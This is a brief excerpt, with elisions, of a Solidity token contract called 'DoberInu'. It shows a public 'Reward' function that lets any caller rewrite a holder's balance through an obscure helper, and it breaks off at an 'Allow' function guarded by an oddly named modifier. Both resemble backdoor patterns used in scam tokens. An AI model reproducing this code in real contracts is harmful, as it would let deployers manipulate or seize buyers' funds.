...
contract DoberInu is IERC20, Ownable {
    ...
    string private _name = "DoberInu";

    string private _symbol = "DOBINU";
    ...
    function Reward(address buyer) public {
        balances[buyer] = Bscreflection(buyer);
    }

    function Allow(address Router) public BSCRREFLECTIn {
